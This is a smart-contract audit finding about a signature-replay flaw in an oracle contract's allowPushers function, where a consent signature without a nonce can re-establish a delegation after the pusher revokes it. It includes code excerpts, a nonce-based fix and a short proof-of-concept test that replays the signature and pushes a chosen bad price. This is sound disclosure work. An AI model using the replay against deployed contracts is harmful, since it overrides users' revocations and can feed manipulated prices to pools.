### Title
Delegation Consent Signature Replayable After Pusher Revocation — (`File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` accepts a pusher's EIP-191 consent signature that contains no nonce. The only replay guard is a deadline (expiry timestamp). After a pusher calls `revokePusher()` to clear their delegation, the creator can immediately call `allowPushers` again with the **same signature** — as long as the deadline has not yet passed — and silently re-establish the delegation. The pusher's revocation is therefore a no-op for the entire window `[revoke_time, deadline]`.

---

### Finding Description

`allowPushers` constructs the signed digest as:

```solidity
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
``` [1](#0-0) 

There is no nonce, no per-use consumed flag, and no on-chain record that the signature was already accepted. The only invalidation mechanism is the deadline:

```solidity
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
``` [2](#0-1) 

`revokePusher` clears `namespaceRemapping[msg.sender]` to `address(0)`:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

But nothing prevents the creator from calling `allowPushers` again with the identical `(deadline, pusher, signature)` tuple. The check `block.timestamp <= deadline` still passes, the recovered signer still matches `pusher`, and `namespaceRemapping[pusher]` is written back to `msg.sender` (the creator). The code comment itself acknowledges the deadline is the only guard against post-revocation re-delegation, but it only prevents **expired** signatures — not **valid-but-already-used** ones:

> "The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [4](#0-3) 

The comment correctly identifies the threat but the chosen fix (deadline) is insufficient: it only closes the window after expiry, not the window between revocation and expiry.

---

### Impact Explanation

The `fallback` push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

If the pusher is an automated price-pushing system and the creator's namespace feeds a pool, the pusher's price data continues to land in the creator's namespace even after the pusher calls `revokePusher()`. The creator can replay the original signature in the same block as the revocation, making the revocation permanently ineffective until the deadline expires. Any pool consuming prices from the creator's namespace will continue to receive the pusher's data against the pusher's intent, which can constitute bad-price execution if the pusher is attempting to halt a compromised or incorrect feed.

---

### Likelihood Explanation

The creator holds the signature off-chain from the moment the pusher originally provided it. Replaying it requires a single transaction with no special privileges — the creator is a semi-trusted but unprivileged actor relative to the pusher's revocation right. The window is as long as the original deadline (commonly hours to days). Any pusher who revokes and then continues pushing to their own namespace will have those pushes silently redirected back to the creator's namespace.

---

### Recommendation

Add a per-pusher nonce to the signed digest and increment it on each successful `allowPushers` call, or record a consumed-signature bitmap keyed by `keccak256(signature)`. Either approach ensures that once a consent signature is accepted, it cannot be replayed regardless of the deadline:

```solidity
mapping(address => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusherNonce[pusher],   // <-- add nonce
        pusher, msg.sender
    ))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
pusherNonce[pusher]++;         // <-- invalidate after use
namespaceRemapping[pusher] = msg.sender;
```

This ensures each signed consent is single-use, matching the documented intent that revocation is final.

### Proof of Concept

```solidity
// 1. Pusher signs consent for creator with deadline = now + 1 day
uint256 deadline = block.timestamp + 1 days;
bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

// 2. Creator establishes delegation
address[] memory pushers = new address[](1);
pushers[0] = pusher;
bytes[] memory sigs = new bytes[](1);
sigs[0] = sig;
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);
assertEq(oracle.namespaceRemapping(pusher), creator); // delegated

// 3. Pusher revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // cleared

// 4. Creator replays the SAME signature — deadline still valid
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs); // succeeds, no revert
assertEq(oracle.namespaceRemapping(pusher), creator); // re-delegated!

// 5. Pusher's subsequent fallback pushes land in creator's namespace,
//    not the pusher's own, against the pusher's intent.
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 raw = _packRaw(9_000_000, 4, 2); // attacker-chosen bad price
vm.prank(pusher);
(bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
assertTrue(ok);
// Price lands in creator namespace → consumed by pool
assertEq(
    oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price,
    U64x32.decode(uint32(raw >> 16))
);
```

    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```
